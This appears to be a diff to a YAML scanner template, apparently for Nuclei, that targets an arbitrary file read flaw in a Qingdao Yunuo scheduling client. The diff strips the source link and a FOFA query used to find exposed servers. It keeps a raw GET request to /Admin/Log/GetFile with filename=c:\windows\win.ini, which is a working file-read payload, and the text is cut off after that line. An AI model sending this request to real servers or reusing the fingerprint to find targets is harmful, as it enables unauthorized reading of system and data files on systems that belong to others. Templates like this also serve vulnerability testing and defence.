@@ -3,12 +3,8 @@ info:
   name: 青岛雨诺网络信息股份有限公司雨诺调度客户端GetFile存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bh9pt1s7771uoa9k'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bh9pt1s7771uoa9k
-    fofa: body="/Captcha/Index" && body="layadmin-user-login-codeimg11"
 http:
 - raw:
   - 'GET /Admin/Log/GetFile?filename=c:\windows\win.ini HTTP/1.1
